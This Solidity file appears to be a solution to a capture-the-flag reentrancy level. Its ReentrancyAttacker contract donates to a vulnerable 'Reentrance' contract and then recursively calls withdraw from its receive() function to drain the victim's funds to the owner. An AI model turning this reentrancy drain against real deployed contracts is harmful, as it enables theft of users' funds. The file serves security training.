// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "../10-Reentrancy.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";

contract ReentrancyAttacker {
    event log(uint256);
    Reentrance victim;
    address owner;

    constructor(address _victimContract, address _owner) public {
        victim = Reentrance(payable(_victimContract));
        owner = _owner;
    }

    function attack() external payable {
        victim.donate{value: 1 ether}(address(this));
        victim.withdraw(1 ether);
    }

    function withdraw() external {
        require(msg.sender == owner);
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {
        uint256 toSteal = victim.balanceOf(address(this));
        victim.withdraw(toSteal);
    }
}
